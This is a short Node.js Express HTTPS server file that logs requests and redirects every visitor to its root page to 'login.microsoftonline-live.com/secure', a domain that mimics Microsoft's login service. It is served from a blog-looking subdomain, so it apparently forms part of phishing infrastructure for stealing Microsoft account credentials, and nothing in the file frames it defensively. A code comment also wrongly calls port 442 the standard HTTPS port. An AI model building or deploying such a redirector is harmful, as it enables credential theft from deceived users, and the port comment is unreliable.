const fs = require('fs');
const https = require('https');
const express = require('express');
const winston = require('winston');

const app = express();

const privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
const credentials = { key: privateKey, cert: certificate };

const port = 442; // Standard HTTPS port

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: '/path/to/logs/error.log', level: 'error' }),
    new winston.transports.File({ filename: '/path/to/logs/combined.log' }),
  ],
});

app.use((req, res, next) => {
  logger.info(`Request received: ${req.method} ${req.url}`);
  next();
});

app.get('/', (req, res) => {
  setTimeout(() => {
    res.redirect('https://login.microsoftonline-live.com/secure');
  }, 10);
});

const httpsServer = https.createServer(credentials, app);

httpsServer.listen(port, '0.0.0.0', () => {
  logger.info(`Proxy server listening at https://blog.toptier.ventures`);
});

process.on('uncaughtException', (err) => {
  logger.error(`Uncaught Exception: ${err.message}`);
  logger.error(err.stack);
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
